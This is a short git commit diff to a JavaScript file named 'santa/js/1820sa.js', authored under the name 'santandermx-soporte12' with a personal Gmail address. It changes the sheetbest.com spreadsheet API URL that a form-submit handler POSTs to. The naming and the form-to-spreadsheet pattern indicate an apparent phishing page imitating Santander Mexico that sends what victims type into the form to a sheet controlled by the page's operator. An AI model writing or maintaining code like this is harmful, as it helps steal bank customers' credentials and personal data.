0e8600976ddcf8182f8562b5912e96a31d6540e1
santandermx-soporte12 <richglez9384@gmail.com>
2026-03-06 10:18:35 -0600

    Update 1820sa.js

--- santa/js/1820sa.js
+++ santa/js/1820sa.js
@@ -7,7 +7,7 @@ formulario.addEventListener('submit', async(e) =>{
 
 
 try {    
-    const respuesta = await fetch('https://api.sheetbest.com/sheets/c4b3435f-e064-4490-b04a-c94d49114333', {
+    const respuesta = await fetch('https://api.sheetbest.com/sheets/856e0079-14c9-44b8-b2f4-f4820098812a', {
         method: 'POST',
         mode: 'cors',
         headers: {
